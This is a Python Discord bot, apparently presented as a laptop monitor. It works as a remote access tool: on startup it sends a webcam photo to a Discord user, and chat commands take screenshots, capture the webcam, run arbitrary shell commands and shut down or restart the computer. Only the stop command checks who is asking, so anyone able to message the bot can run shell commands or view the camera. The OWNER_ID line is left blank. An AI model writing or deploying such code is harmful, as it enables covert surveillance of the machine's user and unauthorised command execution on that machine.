import os
import cv2
import discord
import asyncio
import subprocess
import pyautogui
from discord.ext import commands
from mss import mss
import logging
from PIL import Image
import sys

# Ensure absolute path for logging and files
BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# Hardcode Discord token and owner ID
TOKEN = ""  # Replace with your Discord bot token
OWNER_ID = # Replace with your Discord user ID (an integer)

# Validate credentials
if not TOKEN or not OWNER_ID:
    logging.error("DISCORD_TOKEN or OWNER_ID not set")
    raise ValueError("DISCORD_TOKEN or OWNER_ID not set")

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[logging.FileHandler(os.path.join(BASE_DIR, "monitor.log"), mode="a"), logging.StreamHandler()]
)

# Setup bot
intents = discord.Intents.default()
intents.message_content = True
intents.dm_messages = True
bot = commands.Bot(command_prefix="!", intents=intents)

# Webcam capture
def capture_webcam(filename):
    try:
        cam = cv2.VideoCapture(0, cv2.CAP_DSHOW)
        if not cam.isOpened():
            logging.error("Webcam not accessible")
            return False
        cam.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
        cam.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
        ret, frame = cam.read()
        if ret and frame is not None and frame.size > 0:
            cv2.imwrite(filename, frame, [cv2.IMWRITE_JPEG_QUALITY, 80])
            logging.info(f"Webcam photo saved as {filename}")
            cam.release()
            return True
        cam.release()
        logging.error("Failed to capture webcam frame")
        return False
    except Exception as e:
        logging.error(f"Webcam capture failed: {e}")
        return False

# Screenshot capture
def capture_screenshot(filename):
    try:
        screenshot = pyautogui.screenshot()
        screenshot.save(filename)
        if os.path.getsize(filename) > 1000:
            logging.info(f"Screenshot saved as {filename} using pyautogui")
            return True
        logging.warning("pyautogui captured a blank or tiny image")
    except Exception as e:
        logging.warning(f"pyautogui screenshot failed: {e}, falling back to mss")
    
    try:
        with mss() as sct:
            monitor = sct.monitors[1]
            logging.info(f"mss monitor details: {monitor}")
            screenshot = sct.grab(monitor)
            img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
            img.save(filename, "PNG")
            if os.path.getsize(filename) > 1000:
                logging.info(f"Screenshot saved as {filename} using mss")
                return True
            logging.warning("mss captured a blank or tiny image")
    except Exception as e:
        logging.error(f"mss screenshot failed: {e}")
        return False

# Startup message with 15-second webcam delay
async def send_startup_message():
    try:
        owner = await bot.fetch_user(OWNER_ID)
        if owner:
            msg = await owner.send("🔔 **Laptop Turned On!** - Webcam initializing...")
            logging.info("Startup message sent")
            await asyncio.sleep(15)
            webcam_file = os.path.join(BASE_DIR, "startup.jpg")
            if capture_webcam(webcam_file):
                await owner.send(file=discord.File(webcam_file))
                os.remove(webcam_file)
                logging.info("Webcam photo sent after 15-second delay")
            else:
                await owner.send("⚠️ Webcam unavailable")
                logging.info("Webcam unavailable after 15-second delay")
    except Exception as e:
        logging.error(f"Startup message failed: {e}")

# Screenshot command
@bot.command()
async def screenshot(ctx):
    try:
        msg = await ctx.send("📸 **Capturing screenshot...**")
        screenshot_file = os.path.join(BASE_DIR, "screenshot.png")
        if capture_screenshot(screenshot_file):
            await msg.edit(content="📸 **Screenshot Captured!**", attachments=[discord.File(screenshot_file)])
            os.remove(screenshot_file)
        else:
            await msg.edit(content="❌ **Error:** Could not capture screenshot")
    except Exception as e:
        logging.error(f"Screenshot command failed: {e}")
        await ctx.send("❌ **Error:** Screenshot failed")

# Webcam command
@bot.command()
async def camera(ctx):
    try:
        msg = await ctx.send("📷 **Capturing webcam...**")
        webcam_file = os.path.join(BASE_DIR, "webcam.jpg")
        if capture_webcam(webcam_file):
            await msg.edit(content="📷 **Webcam Capture!**", attachments=[discord.File(webcam_file)])
            os.remove(webcam_file)
        else:
            await msg.edit(content="❌ **Error:** Webcam not available")
    except Exception as e:
        logging.error(f"Camera command failed: {e}")
        await ctx.send("❌ **Error:** Webcam failed")

# Shell command
@bot.command()
async def shell(ctx, *, command=None):
    try:
        if not command:
            await ctx.send("❌ **Error:** Provide a command (e.g., !shell dir)")
            return
        msg = await ctx.send(f"💻 **Running:** `{command}`")
        output = subprocess.check_output(command, shell=True, text=True, timeout=5)
        await msg.edit(content=f"💻 **Output:**\n```{output[:1900]}```")
    except subprocess.TimeoutExpired:
        await msg.edit(content="❌ **Error:** Command timed out")
    except Exception as e:
        await ctx.send(f"❌ **Error:** {str(e)}")

# Shutdown command
@bot.command()
async def shutdown(ctx):
    try:
        await ctx.send("⚠️ **Shutting down...**")
        os.system("shutdown /s /t 0" if os.name == "nt" else "shutdown now")
    except Exception as e:
        await ctx.send(f"❌ **Error:** Shutdown failed: {str(e)}")

# Restart command
@bot.command()
async def restart(ctx):
    try:
        await ctx.send("🔄 **Restarting...**")
        os.system("shutdown /r /t 0" if os.name == "nt" else "reboot")
    except Exception as e:
        await ctx.send(f"❌ **Error:** Restart failed: {str(e)}")

# Stop bot command
@bot.command()
async def stop(ctx):
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ **Error:** Only the owner can stop the bot!")
        return
    await ctx.send("🛑 **Stopping bot...**")
    await bot.close()

# Bot ready event
@bot.event
async def on_ready():
    logging.info(f"Bot connected as {bot.user}")
    await send_startup_message()

# Run bot
async def main():
    try:
        logging.info("Starting bot...")
        await bot.start(TOKEN)
    except Exception as e:
        logging.error(f"Bot failed: {e}")
        await asyncio.sleep(5)
        await main()

if __name__ == "__main__":
    asyncio.run(main())
